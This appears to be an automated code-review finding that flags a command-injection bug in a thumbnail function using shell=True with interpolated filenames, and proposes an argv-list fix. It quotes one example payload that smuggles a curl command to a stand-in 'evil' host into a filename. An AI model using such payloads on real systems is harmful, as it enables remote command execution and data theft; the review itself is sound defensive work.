findings.body:
Interpolating `upload_dir`, `name`, and `oid` into a `shell=True` command lets a crafted filename run arbitrary shell. A value such as `x.png; curl http://evil/$(id)` (or metacharacters in `oid` / `upload_dir`) executes as the convert user. ImageMagick 7 still reads policy.xml when spawned with an argv list; if the binary name changed, pass `['/usr/bin/magick', ...]` (or `/usr/bin/convert`) as a list and drop `shell=True`.

```suggestion
    subprocess.run(
        ["/usr/bin/convert", f"{upload_dir}/{name}", f"/srv/thumbs/{oid}.png"],
        check=True,
    )
```

summary: I'd recommend not merging until the shell-injection in `thumbs.py` is reverted to argv-list form. Switching `make_thumb` to `subprocess.run(..., shell=True)` with an f-string of `upload_dir`, `name`, and `oid` lets a crafted filename (or oid) execute as the convert user. ImageMagick 7 policy.xml still applies when convert is spawned with an argv list; if IM7 needs the `magick` binary, change only that path. **Recommendation:** request-changes

verification.reason: The head version of `make_thumb` runs `subprocess.run` with `shell=True` and an f-string that interpolates `upload_dir`, `name`, and `oid`, so shell metacharacters in those values execute as the convert user. Base used a safe argv list without `shell=True`; this is a real critical command-injection
